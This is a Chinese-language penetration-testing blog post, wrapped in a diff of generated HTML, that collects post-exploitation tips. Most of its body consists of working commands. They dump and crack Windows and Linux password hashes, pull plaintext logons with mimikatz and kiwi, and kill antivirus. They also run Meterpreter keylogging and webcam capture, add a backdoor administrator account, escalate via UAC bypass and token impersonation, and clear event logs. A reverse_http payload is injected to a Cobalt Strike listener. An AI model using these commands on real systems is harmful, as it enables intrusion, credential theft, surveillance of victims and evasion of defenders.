@@ -1,0 +1,657 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>后渗透TIPS | 乙太</title><meta name="author" content="乙太"><meta name="copyright" content="乙太"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="linux密码爆破john test.txt –format&#x3D;crypt  john爆破出现Using default input encoding: UTF-8 No password hashes loaded (see FAQ) 我以为是  在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式:set fileencoding&#x3D;utf-8查看文件格式:set file">
+<meta property="og:type" content="article">
+<meta property="og:title" content="后渗透TIPS">
+<meta property="og:url" content="https://blog.oisec.cn/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/index.html">
+<meta property="og:site_name" content="乙太">
+<meta property="og:description" content="linux密码爆破john test.txt –format&#x3D;crypt  john爆破出现Using default input encoding: UTF-8 No password hashes loaded (see FAQ) 我以为是  在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式:set fileencoding&#x3D;utf-8查看文件格式:set file">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.oisec.cn/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png">
+<meta property="article:published_time" content="2026-05-27T16:19:48.000Z">
+<meta property="article:modified_time" content="2026-05-27T17:42:50.303Z">
+<meta property="article:author" content="乙太">
+<meta property="article:tag" content="查看破解结果">
+<meta property="article:tag" content="查看目标主机系统信息">
+<meta property="article:tag" content="查看目标主机详细信息">
+<meta property="article:tag" content="导出密码的哈希">
+<meta property="article:tag" content="加载">
+<meta property="article:tag" content="查看目标主机进程信息">
+<meta property="article:tag" content="查看当前Meterpreter">
+<meta property="article:tag" content="将当前Meterpreter">
+<meta property="article:tag" content="查看主机运行时间">
+<meta property="article:tag" content="查看获取的当前权限">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="关闭杀毒软件">
+<meta property="article:tag" content="截图">
+<meta property="article:tag" content="查看目标主机的摄像头">
+<meta property="article:tag" content="拍照">
+<meta property="article:tag" content="开视频">
+<meta property="article:tag" content="执行可执行程序">
+<meta property="article:tag" content="开启远程桌面">
+<meta property="article:tag" content="开启键盘记录功能">
+<meta property="article:tag" content="显示捕捉到的键盘记录信息">
+<meta property="article:tag" content="停止键盘记录功能">
+<meta property="article:tag" content="禁止目标使用键盘">
+<meta property="article:tag" content="允许目标使用键盘">
+<meta property="article:tag" content="禁止目标使用鼠标">
+<meta property="article:tag" content="允许目标使用鼠标">
+<meta property="article:tag" content="使用扩展库">
+<meta property="article:tag" content="清除日志">
+<meta property="article:tag" content="在具有Isass进程的权限才可以抓到密码">
+<meta property="article:tag" content="如果当前是user权限要管理员权限才能开启3389">
+<meta property="article:tag" content="要用到bypassuac提权">
+<meta property="article:tag" content="进入shell">
+<meta property="article:tag" content="将用户提升到管理员权限">
+<meta property="article:tag" content="getpid">
+<meta property="article:tag" content="查看meterpreter">
+<meta property="article:tag" content="kill">
+<meta property="article:tag" content="关闭进程">
+<meta property="article:tag" content="run">
+<meta property="article:tag" content="自动迁移进程">
+<meta property="article:tag" content="cobaltstrike监听的端口">
+<meta property="article:tag" content="cobaltstrike监听的ip">
+<meta property="article:tag" content="这里是获得的session的id">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.oisec.cn/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "后渗透TIPS",
+  "url": "https://blog.oisec.cn/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/",
+  "image": "https://blog.oisec.cn/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png",
+  "datePublished": "2026-05-27T16:19:48.000Z",
+  "dateModified": "2026-05-27T17:42:50.303Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "乙太",
+      "url": "https://blog.oisec.cn"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://blog.oisec.cn/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":2,"unescape":true,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '后渗透TIPS',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/github-chart.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="乙太" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/toux.jpg" alt="Logo"><span class="site-name">乙太</span></a><a class="nav-page-title" href="/"><span class="site-name">后渗透TIPS</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">后渗透TIPS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-27T16:19:48.000Z" title="发表于 2026-05-28 00:19:48">2026-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-27T17:42:50.303Z" title="更新于 2026-05-28 01:42:50">2026-05-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/">渗透的自己容易忘记的但是有用的小技巧</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>linux密码爆破<br>john test.txt –format&#x3D;crypt</p>
+<p> john爆破出现Using default input encoding: UTF-8 No password hashes loaded (see FAQ)<br> 我以为是</p>
+<blockquote>
+<p>在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式<br><code>:set fileencoding=utf-8</code><br>查看文件格式<br><code>:set fileformat?</code><br>设置文件格式为 unix<br><code>:set fileformat=unix</code></p>
+</blockquote>
+<p>结果不是<br> 出现这个提示不是说明破解失败了，而是这个hash以前被你破解过，可以使用以下命令查看破解出的密码是什么。<br>使用下面这条命令即可解决<br>john –show password.txt</p>
+<p>msf永恒之蓝命令执行后：<br>hashdump得到的值拿到最后32位字母数字组合可以在下图,注意类型是NTLM<br><img src="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png" alt="Pasted image 20240318142344"></p>
+<p><img src="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318114658.png" alt="Pasted image 20240318114658"></p>
+<p>unshadow命令基本上会结合&#x2F;etc&#x2F;passwd的数据和&#x2F;etc&#x2F;shadow的数据，创建1个含有用户名和密码详细信息的文件<br>unshadow &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &gt; shadow</p>
+<p>Windows的登录密码的hash值保存在SAM文件中，SAM是“security account manager”的首字母缩写。通常，它位于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\system32\config\SAM</span><br></pre></td></tr></table></figure>
+<p>SAM文件被Windows保护，不能直接读取，需借助工具，如<a target="_blank" rel="noopener" href="http://www.insidepro.com/download/saminside.zip">SAMInside</a>。找一台Windows7虚拟机，新建一个名为hashcat的管理员用户，并设置密码，在Windows7中下载并解压SAMInside后以管理员权限运行，然后点击File-&gt;Import Local Users vis Scheduler，如下图所示：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//导出 SAM 和 System 文件：通过 reg 的注册表导出</span><br><span class="line">reg save hklm\sam sam<span class="selector-class">.hive</span> </span><br><span class="line">reg save hklm\system system<span class="selector-class">.hive</span></span><br><span class="line">move 移动文件</span><br><span class="line">//使用mimikatz读取SAM和System文件</span><br><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samdump2 system<span class="selector-class">.hive</span> sam<span class="selector-class">.hive</span> &gt; hash<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john -format=NT hash.txt  <span class="comment">#破解win,使用john自带的密码字典</span></span><br><span class="line">john --show -format=NT hash.txt    <span class="comment">#查看破解结果</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3958?time__1311=n4+xnD0DBDgGG=G8QrDsA3xCqxQTNfqhhqiI5x">安全工具——John the Ripper - 先知社区</a><br><img src="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318155653.png" alt="Pasted image 20240318155653"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john ~/.ssh/id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2john newdb.kdb &gt; newdb.kdb.hash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar2john encrypted.rar &gt; encrypted.rar.hash</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!ips]<br>后渗透阶段:<br>在meterpreter &gt; 中我们可以使用以下的命令来实现对目标的操作：<br>sysinfo             #查看目标主机系统信息<br>run scraper         #查看目标主机详细信息<br>hashdump        #导出密码的哈希<br>load kiwi           #加载<br>ps                  #查看目标主机进程信息<br>pwd                 #查看目标当前目录(windows)<br>getlwd              #查看目标当前目录(Linux)<br>search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>download  e:\test.txt  &#x2F;root          #将目标机的e:\test.txt文件下载到&#x2F;root目录下<br>upload    &#x2F;root&#x2F;test.txt d:\test      #将&#x2F;root&#x2F;test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程<br>PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>idletime            #查看主机运行时间<br>getuid              #查看获取的当前权限<br>getsystem           #提权<br>run  killav         #关闭杀毒软件<br>screenshot          #截图<br>webcam_list         #查看目标主机的摄像头<br>webcam_snap         #拍照<br>webcam_stream       #开视频<br>execute  参数  -f 可执行文件   #执行可执行程序<br>run getgui -u hack -p 123    #创建hack用户，密码为123<br>run getgui -e                #开启远程桌面<br>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<br>keyscan_start                #开启键盘记录功能<br>keyscan_dump                 #显示捕捉到的键盘记录信息<br>keyscan_stop                 #停止键盘记录功能<br>uictl  disable  keyboard     #禁止目标使用键盘<br>uictl  enable   keyboard     #允许目标使用键盘<br>uictl  disable  mouse        #禁止目标使用鼠标<br>uictl  enable   mouse        #允许目标使用鼠标<br>load                         #使用扩展库<br>run                             #使用扩展库<br>clearev                       #清除日志</p>
+</blockquote>
+<p>mimikatz</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##右键以管理员权限运行</span></span><br><span class="line"><span class="comment">##获取调试权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"><span class="comment">#在具有Isass进程的权限才可以抓到密码</span></span><br><span class="line"><span class="comment">##抓取密码</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>wifi密码抓取</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profile </span><br><span class="line">netsh wlan show profile name=&quot;ssid&quot; KEY=<span class="attribute">clear</span></span><br></pre></td></tr></table></figure>
+
+<p>windows 控制台cmd乱码的解决办法 chcp 65001</p>
+<p>开启远程桌面的办法</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="meta">#如果当前是user权限要管理员权限才能开启3389</span></span><br><span class="line"><span class="meta">#要用到bypassuac提权</span></span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line"><span class="keyword">set</span> session <span class="number">1</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line"><span class="meta">#进入shell</span></span><br><span class="line">net user hacker <span class="number">123</span>qwe.. /<span class="keyword">add</span></span><br><span class="line"><span class="meta">#将用户提升到管理员权限</span></span><br><span class="line">net localgroup administrators hacker /<span class="keyword">add</span></span><br><span class="line"></span><br><span class="line">rdesktop -u hacker -p <span class="number">123</span>qwe..  <span class="number">192.168</span><span class="number">.1</span><span class="number">.145</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">使用kiwi来获取靶机密码，注意这里需要进行的一个操作为进程迁移，因为我们这里上线到msf的载荷是<span class="number">32</span>位的(即x86)，这里需要找一个<span class="number">64</span>位的(即x64)进行进程迁移才能使用kiwi获取靶机密码</span><br><span class="line"></span><br><span class="line">sessions -<span class="selector-tag">i</span> <span class="number">2</span></span><br><span class="line">load kiwi</span><br><span class="line">kiwi_cmd privilege::debug</span><br><span class="line">ps</span><br><span class="line">#getpid #查看meterpreter shell的进程号</span><br><span class="line"></span><br><span class="line">migrate <span class="number">1144</span></span><br><span class="line">#kill <span class="number">2496</span> #关闭进程</span><br><span class="line">#run post/windows/manage/migrate #自动迁移进程</span><br><span class="line"></span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>遇到杀软，无法甜土豆提权，可msf获得会话后假冒令牌提权</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>msf联动cs</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">回到msf，输入<span class="attribute">background</span>，将我们得到的会话放在后台</span><br><span class="line"><span class="selector-tag">use</span> exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lport <span class="number">1233</span> <span class="selector-id">#cobaltstrike</span>监听的端口</span><br><span class="line">set lhost <span class="number">192.168</span>.<span class="number">19.129</span> <span class="selector-id">#cobaltstrike</span>监听的ip</span><br><span class="line">set disablepayloadhandler true #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set session <span class="number">1</span> #这里是获得的session的id</span><br><span class="line">打开cs 开启监听，端口为<span class="number">1233</span>，点击add添加监听</span><br></pre></td></tr></table></figure>
+
+<p>web服务器的php配置有个disable_functions可以禁用一些危险函数，可以用phpinfo查看是否开启，getshell后蚂蚁剑有插件市场可以绕过</p>
+<p>设置tcp代理<br>这里因为有两个网段就先把路由添加上方便后续操作<br>msf操作<br>route add 192.168.138.0 255.255.255.0 2<br>route print<br>session操作<br>run autoroute -s 192.168.138.0&#x2F;24<br>run autoroute -p&#96;</p>
+<p>在cobaltstrike中进行内网渗透的时候，获得一个主机的会话之后最好再派生一个smb会话，这样比较的隐蔽。</p>
+<p>shell whoami &#x2F;groups 查看当前用户所在的用户组</p>
+<p>High为高权限   MIdem为地权限</p>
+<p>shell net user 查看当前计算机所有用户</p>
+<p>net view &#x2F;domain查找当前域</p>
+<p>netview&#x2F;domain:[domain] 查看当前域主机列表</p>
+<p>然后可以使用shell ping [域内主机名字] 获取域内主机ip</p>
+<p>提权方式有多种，1.BypassUAC   2.使用ms14-058提权  3. powershell-import  PowerTools&#x2F;PowerUp&#x2F;PowerUp.ps1  、、、、4. 最后记得转储存hash、、、mimikatz制作黄金钥匙</p>
+<p>参考链接<br><a target="_blank" rel="noopener" href="https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/">使用hashcat爆破各种hash | 若水斋</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/11/winhash.html">Windows 用户密码的加密方法与破解 | 国光</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hkgan/p/17339860.html">永恒之蓝漏洞复现(ms17-010) - hkgan - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/277707.html">SMBGhost_RCE漏洞利用（MSF和CS联动） - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53087192/article/details/112707016">MSF中kiwi模块的使用_load kivi-CSDN博客</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E7%A0%B4%E8%A7%A3%E7%BB%93%E6%9E%9C/">查看破解结果</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/">查看目标主机系统信息</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/">查看目标主机详细信息</a><a class="post-meta__tags" href="/tags/%E5%AF%BC%E5%87%BA%E5%AF%86%E7%A0%81%E7%9A%84%E5%93%88%E5%B8%8C/">导出密码的哈希</a><a class="post-meta__tags" href="/tags/%E5%8A%A0%E8%BD%BD/">加载</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/">查看目标主机进程信息</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8DMeterpreter/">查看当前Meterpreter</a><a class="post-meta__tags" href="/tags/%E5%B0%86%E5%BD%93%E5%89%8DMeterpreter/">将当前Meterpreter</a><a class="post-meta__tags" 